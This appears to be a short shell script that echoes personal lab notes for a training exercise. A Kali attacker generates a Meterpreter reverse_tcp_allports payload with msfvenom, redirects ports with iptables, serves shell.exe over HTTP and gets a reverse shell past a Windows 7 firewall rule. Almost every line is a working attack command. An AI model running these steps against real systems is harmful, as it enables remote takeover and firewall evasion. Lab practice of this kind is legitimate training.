echo '
--] FIND AND NC INTERACTION 45

OPERATOR   === KALI               IP === 132
TANGO      === WIN 7              IP === 134
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set lhost  172.16.14.132
OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=IP_OPERATOR lport=4444 
OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp_allports lhost=172.16.14.132 lport=4444 -f exe > shell.exe
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp_allports 
TANGO       ==> TASK ==> go to firewall advanced security 
TANGO       ==> TASK ==> New Rule
TANGO       ==> TASK ==> TCP
TANGO       ==> TASK ==> Specific local ports 4444-5555
TANGO       ==> TASK ==> Block the connexion
TANGO       ==> TASK ==> Name is block
OPERATOR    ==> INFO ==> iptable  --flush   -F [chain]          Delete all rules in  chain or all chains
OPERATOR    ==> TASK ==> iptables -A PREROUTING -t nat -p tcp --dport 4444:5556 -j REDIRECT --to-port 4444
OPERATOR    ==> TASK ==> python3 -m http.server 80
TANGO       ==> TASK ==> go internet explorer and download shell.exe 
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp_allports
OPERATOR    ==> TASK ==> exploit -j
OPERATOR    ==> TASK ==> session -i 1
OPERATOR    ==> TASK ==> netstat and check the port of shell.exe he have bypass local firewall

'
read